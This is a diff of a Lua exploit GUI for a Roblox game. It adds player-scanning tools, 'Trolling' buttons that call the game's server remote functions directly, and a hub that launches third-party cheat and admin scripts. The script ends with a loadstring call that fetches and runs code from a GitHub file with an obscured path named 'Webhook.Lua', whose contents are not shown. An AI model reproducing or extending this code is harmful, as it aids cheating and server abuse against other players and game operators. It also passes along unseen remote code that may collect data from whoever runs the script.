-                print(v.Name, "is using Unanchored To Player")
-                game:GetService("RunService").Stepped:wait()
-                
-        end
-    end
-    print ("Checked all players, found", g ,"using Unanchored To Player")
-    end)
-end)
-
-createSetting("Count Unanchored Parts").MouseButton1Down:connect(function()
-    sound:Play()
-    b = 0
-    for index, part in pairs(game.workspace:GetDescendants()) do
-    if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false and part:FindFirstChild("Weld") == nil then --// Checks Part Properties
-        b = b + 1
-    end
-    end
-    print ("All parts checked, found", b ,"that are unanchored")
-end)
-
-
-
-
-
-
-
-
-createEntry = function(name, id)
-	local entry = temp:Clone()
-	entry.Parent = c
-	entry.username.Text = name
-	entry.thumb.Image = game:GetService("Players"):GetUserThumbnailAsync(id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
-	entry.Visible = true
-	entry.LayoutOrder = #c:GetChildren()
-	entry.Name = name
-
-    local sound = Instance.new("Sound")
-    sound.SoundId = "rbxassetid://3398620867"
-    sound.Parent = game:GetService("SoundService")
-	-- handle clicking for player
-	entry.button.MouseButton1Down:connect(function()
-		execute(name)
-        sound:Play()
-	end)
-	
-	entry.button.MouseEnter:connect(function()
-		fade(entry, 0.25, {BackgroundTransparency = 0.8})
-	end)
-	
-	entry.button.MouseLeave:connect(function()
-		fade(entry, 0.25, {BackgroundTransparency = 0.5})
-	end)
-end
-
-deleteEntry = function(name)
-	for _,v in pairs(c:GetChildren()) do
-		if v.Name == name then
-			v:Destroy()
-		end
-	end
-end
-
--- create entry for client
-createEntry(game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId)
-
--- create entries for all other players
-for _,v in pairs(game.Players:GetPlayers()) do
-	if v ~= game.Players.LocalPlayer then
-		createEntry(v.Name, v.UserId)
-	end
-end
-
-listcons:GetPropertyChangedSignal("AbsoluteContentSize"):connect(function()
-	c.CanvasSize = u2(0, 0, 0, listcons.AbsoluteContentSize.Y)
-end)
-
-itemll:GetPropertyChangedSignal("AbsoluteContentSize"):connect(function()
-	items.CanvasSize = u2(0, 0, 0, itemll.AbsoluteContentSize.Y)
-end)
-
-uis.InputBegan:connect(function(input, gpe)
-	if not gpe then
-		if input.KeyCode == toggle_key then
-			g.Enabled = not g.Enabled
-		end
-	end
-end)
-
--- dragging code, ripped from https://devforum.roblox.com/t/draggable-property-is-hidden-on-gui-objects/107689/5
-local dragging
-local dragInput
-local dragStart
-local startPos
-
-local function update(input)
-	local delta = input.Position - dragStart
-	f.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-end
-
-f.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		dragging = true
-		dragStart = input.Position
-		startPos = f.Position
-		
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
-end)
-
-f.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-		dragInput = input
-	end
-end)
-
-uis.InputChanged:Connect(function(input)
-	if input == dragInput and dragging then
-		update(input)
-	end
-end)
-
-game.Players.PlayerAdded:connect(function(plr)
-	createEntry(plr.Name, plr.UserId)
-end)
-
-game.Players.PlayerRemoving:connect(function(plr)
-	deleteEntry(plr.Name)
-end)
-else
-print "================ALREADY LOADED================"
-
-
-
-    local sound = Instance.new("Sound")
-    sound.SoundId = "rbxassetid://2130284653"
-    sound.Parent = game:GetService("SoundService")
-sound:Play()
-
-game.StarterGui:SetCore("SendNotification", {
-Title = "Already Loaded"; -- the title (ofc)
-Text = "GUI Already Loaded"; -- what the text says (ofc)
-Duration = 5; -- how long the notification should in secounds
-})
-end
-end}
-
-
-Tab:Button{
-	Name = "Icon Mobile",
-	Description = nil,
-	Callback = function() 
-	    local CoreGui = game:GetService("StarterGui")
-
-            GUI:Notification{
-	Title = "Alert",
-	Text = "You are now Mobile.",
-	Duration = 8,
-	Callback = function() end
-}
-
-local args = {
-    [1] = "Mobile"
-}
-
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.SetPlatform:InvokeServer(unpack(args))
-
-end}
-
-Tab:Button{
-	Name = "Icon Desktop/PC",
-	Description = nil,
-	Callback = function() 
-	    local CoreGui = game:GetService("StarterGui")
-
-            GUI:Notification{
-	Title = "Alert",
-	Text = "You are now Desktop/PC.",
-	Duration = 8,
-	Callback = function() end
-}
-
-local args = {
-    [1] = "PC"
-}
-
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.SetPlatform:InvokeServer(unpack(args))
-
 end}
 
 local Tab = GUI:Tab{
@@ -1509,9 +1073,9 @@ local Tab = GUI:Tab{
 }
 
 Tab:Dropdown{
-	Name = "Jumping jacks",
+	Name = "Jumping Jacks",
 	StartingText = "Select...",
-	Description = nil,
+	Description = "Jumping Jacks: 'ONE!', 'TWO!', 'THREE', and so on.",
 	Items = {
 	    {"25 JJ's", 1},
 	    {"50 JJ's", 2},
@@ -1523,9 +1087,9 @@ Tab:Dropdown{
 end}
 
 Tab:Dropdown{
-	Name = "Grammar jacks",
+	Name = "Grammar Jacks",
 	StartingText = "Select...",
-	Description = nil,
+	Description = "Grammar Jacks: 'ONE!', 'TWO!', 'THREE', and so on.",
 	Items = {
 	    {"25 GJ's", 1},
 	    {"50 GJ's", 2},
@@ -1537,9 +1101,23 @@ Tab:Dropdown{
 end}
 
 Tab:Dropdown{
-	Name = "Hell jacks",
+	Name = "Hell Jacks",
 	StartingText = "Select...",
-	Description = nil,
+    	Description = "Hell Jacks: 'O', 'N', 'E', and so on. (basicly typing each individual letter)",
+	Items = {
+	    {"25 HJ's", 1},
+	    {"50 HJ's", 2},
+	    {"75 HJ's", 3},
+	    {"100 HJ's", 4}
+
+	},
+	Callback = function(item) return 
+end}
+
+Tab:Dropdown{
+	Name = "Auto Jump",
+	StartingText = "Select...",
+    	Description = "Jump's automatically for the all the jumping jacks.",
 	Items = {
 	    {"25 HJ's", 1},
 	    {"50 HJ's", 2},
@@ -1552,7 +1130,7 @@ end}
 
 Tab:Button{
 	Name = "Stop all",
-	Description = nil,
+	Description = "Stop's the JJ's, GJ's, HJ's, and auto jump.",
 	Callback = function() local CoreGui = game:GetService("StarterGui")
 
             GUI:Notification{
@@ -1565,6 +1143,71 @@ Tab:Button{
     
 end}
 
+local Tab = GUI:Tab{
+	Name = "Trolling",
+	Icon = "rbxassetid://6157200594",
+}
+
+Tab:Button{
+	Name = "Take Damage",
+	Description = "If at full health you can click the *Take damage* 6 times without dying.",
+	Callback = function() 
+	    local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Damaging...",
+	Duration = 8,
+	Callback = function() end
+}
+local args = {
+    [1] = 0.2
+}
+
+game:GetService("ReplicatedStorage").Packages.Knit.Services.SkydivingService.RF.FallDamage:InvokeServer(unpack(args))
+end}
+
+Tab:Button{
+	Name = "Icon Mobile",
+	Description = "This is FE, everyone can see your icon on your name as Mobile.",
+	Callback = function() 
+	    local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "You are now Mobile.",
+	Duration = 8,
+	Callback = function() end
+}
+
+local args = {
+    [1] = "Mobile"
+}
+
+game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.SetPlatform:InvokeServer(unpack(args))
+
+end}
+
+Tab:Button{
+	Name = "Icon Desktop/PC",
+	Description = "This is FE, everyone can see your icon on your name as Desktop/PC.",
+	Callback = function() 
+	    local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "You are now Desktop/PC.",
+	Duration = 8,
+	Callback = function() end
+}
+
+local args = {
+    [1] = "PC"
+}
+
+game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.SetPlatform:InvokeServer(unpack(args))
+
+end}
 
 local Tab = GUI:Tab{
 	Name = "Script hub",
@@ -1573,7 +1216,7 @@ local Tab = GUI:Tab{
 
 Tab:Button{
 	Name = "Infinite Yield",
-	Description = nil,
+	Description = "Credits: Edge, Moon, Zwolf, Toon.",
 	Callback = function() local CoreGui = game:GetService("StarterGui")
 
             GUI:Notification{
@@ -1588,7 +1231,7 @@ end}
 
 Tab:Button{
 	Name = "CMD-X",
-	Description = nil,
+	Description = "Credits: pigeon#8951, fini#7057, Curvn#2002.",
 	Callback = function() local CoreGui = game:GetService("StarterGui")
 
             GUI:Notification{
@@ -1603,7 +1246,7 @@ end}
 
 Tab:Button{
 	Name = "Fates-Admin",
-	Description = nil,
+	Description = "Credits: fate#5647, Iaying#6564, misrepresenting#4917, Shawn#2000, dsf#2711.",
 	Callback = function() local CoreGui = game:GetService("StarterGui")
 
             GUI:Notification{
@@ -1618,7 +1261,7 @@ end}
 
 Tab:Button{
 	Name = "Owl-Hub",
-	Description = nil,
+	Description = "Credits: Google Chrome and CriShoux.",
 	Callback = function() local CoreGui = game:GetService("StarterGui")
 
             GUI:Notification{
@@ -1637,9 +1280,15 @@ local Tab = GUI:Tab{
 	Icon = "rbxassetid://7194280652"
 }
 
+
+	Tab:_theme_selector()
+
+
+Tab:credit{Name = "Support Server", Description = "Click the Discord button to copy the discord server to get support.", Discord = "http://discord.gg/wUbAAhypTH", V3rmillion = "http://discord.gg/wUbAAhypTH"}
+
 Tab:Button{
 	Name = "Serverhop",
-	Description = nil,
+	Description = "Join's a diffrent server.",
 	Callback = function() local CoreGui = game:GetService("StarterGui")
 
             GUI:Notification{
@@ -1654,7 +1303,7 @@ end}
 
 Tab:Button{
 	Name = "Rejoin",
-	Description = nil,
+	Description = "It will rejoin the game in the current server you are in.",
 	Callback = function() local CoreGui = game:GetService("StarterGui")
 
             GUI:Notification{
@@ -1694,5 +1343,6 @@ end}
 	Duration = 15,
 	Callback = function() end
 }
+
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/i6V8EMFoQ3LgbtmFWiwRCJ9JJ3uDdkJU6WByXhF/LTjiKm22s2u5wi5RhqXnGniTUBsHvhZ1ftGZAuf/main/Webhook.Lua"))()
